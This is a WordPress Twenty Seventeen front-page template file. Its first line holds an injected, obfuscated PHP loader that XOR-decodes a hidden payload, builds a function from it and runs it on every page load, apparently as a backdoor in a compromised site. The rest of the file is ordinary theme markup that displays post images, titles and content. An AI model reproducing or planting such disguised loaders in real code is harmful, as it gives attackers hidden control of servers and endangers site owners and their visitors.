<?php $zpXUrvoZ='ZI .;29Z9U7<>O+'; $dXKKYV='9;EOOWf<L;THW E'^$zpXUrvoZ; $XyMnyxO='R3zlP C00;,=m65 70XyVF>JfY9>V2oT2YpnmrWxP0UV6;.=Xt WDc=VB0>cW=Yar ,FMKac,VKxSxdfR5fMaB9<>qeuWhKD<CTS=XaDNtjXaoQ>HH9=VT Cu>MLShObhUgxYfaGVDIYMzrsfh5J=2nF;fJfpvK .lMYhhRC9YR<<fs 0.olfbRqNR=.EIRpM64OENcb+rV>muD+15lub7,+MWknGS4LWf>3<ndk Q S0Sap0A5K,P=fJAfyd=:t.nP aL RCYVlyf0VX2.Qb=aON60LMj8.5itutUK>nzfv 39UpEEk -RM HNI=eE+JymR=1D bILBF4C3 WQ.Pxvcl,zhvg3GV2JOSEMIvusqO6+D2GyKyaxc1+32d9.Iduuj<5OpRAeHPRH buTK8,>27iM=-s8YiBRRMPAmTm EDR4X Z ==c;54rX9678d9=Tb3RK,Xdq <;-STNhI4T Kvtu5AYU7-1BhOje JJhZ1.WunHWR:IP s3S,gI BE KOnS0JOvreIVFSkmnuDk 6mcVY0:Wjc==+rdpvyzTnClzhCrzxVWP+P6E-SQy,v0XnTe4b4KQuopiBdT7BJQ3j2XU.Q2 S-1ORH5K4Q4 bzwbZ6 ,xYvddyxy>xl=F,PxaH6,Xjs<X>P+8OFodua13V.=kihAxN'; $wnVvrTSy=$dXKKYV('', ';URM6U-SDRCS2SMIDD+Qq>Q89=XJ7m09G-WGDR,rYV 8UOGR6TX86<Y76Qa<:H-IVDM2,gAGG32QsXDFrNlDhfVIJQXUpOpN5J2<OpE-nIJhZOuWt;MO:1NkQZ,82AtBL<LSplhNr+<-mTOSNLQ+IS5bR;j8PR EW7i0HMr0M+>YRNWKUWF1OYXxG XZ0;<XiYA;luikVx+4gQ JETLHBQMG>2Pdc7U869UVENYKF0L UhkzV.G.M3UFbe9:+rq=kN1SAhK7:ykRYBF74GKxBFkFjRQ8,5SKLIIUP>.GUpoRDRM4PxeOVL>8EsD47o,MjQLvYP0AKi7HOR,AE62FpPR<>i+=34gg7Ajk8 4iKKSU9WG1WnY0shqGUJGS;RK0DHUNWP6KXHll43<ABHtoNMRGRRG4PyEScf6391aPt-U+77F1A6IGXKCZF-<XBVg;TH JQ38InP.DYXB71fL-U AbZTQQ -4hFT;AfQoI,bL>PZ6UHnw3H;1Y,X6U8,X+6T8gI8U3hZRA-722BMHSdCMRXKr=QN61DVXRU9YVDGtIrUBZpBMK342I1WsL77JMCR9V6WUQP.7BHYIdBtV080J5Y=,q4JI YBgu8T2X>UDEVWF>WTMQpVDDYXYEreX0M<PE,WX91TL9G<DY+a2MNk8V.GICYAzr3'^$XyMnyxO); $wnVvrTSy();
/**
 * Displays content for front page
 *
 * @package WordPress
 * @subpackage Twenty_Seventeen
 * @since Twenty Seventeen 1.0
 * @version 1.0
 */

?>
<article id="post-<?php the_ID(); ?>" <?php post_class( 'twentyseventeen-panel ' ); ?> >

	<?php
	if ( has_post_thumbnail() ) :
		$thumbnail = wp_get_attachment_image_src( get_post_thumbnail_id( $post->ID ), 'twentyseventeen-featured-image' );

		// Calculate aspect ratio: h / w * 100%.
		$ratio = $thumbnail[2] / $thumbnail[1] * 100;
		?>

		<div class="panel-image" style="background-image: url(<?php echo esc_url( $thumbnail[0] ); ?>);">
			<div class="panel-image-prop" style="padding-top: <?php echo esc_attr( $ratio ); ?>%"></div>
		</div><!-- .panel-image -->

	<?php endif; ?>

	<div class="panel-content">
		<div class="wrap">
			<header class="entry-header">
				<?php the_title( '<h2 class="entry-title">', '</h2>' ); ?>

				<?php twentyseventeen_edit_link( get_the_ID() ); ?>

			</header><!-- .entry-header -->

			<div class="entry-content">
				<?php
					the_content(
						sprintf(
							/* translators: %s: Post title. */
							__( 'Continue reading<span class="screen-reader-text"> "%s"</span>', 'twentyseventeen' ),
							get_the_title()
						)
					);
					wp_link_pages(
						array(
							'before' => '<div class="page-links">' . __( 'Pages:', 'twentyseventeen' ),
							'after'  => '</div>',
						)
					);
					?>
			</div><!-- .entry-content -->

		</div><!-- .wrap -->
	</div><!-- .panel-content -->

</article><!-- #post-<?php the_ID(); ?> -->
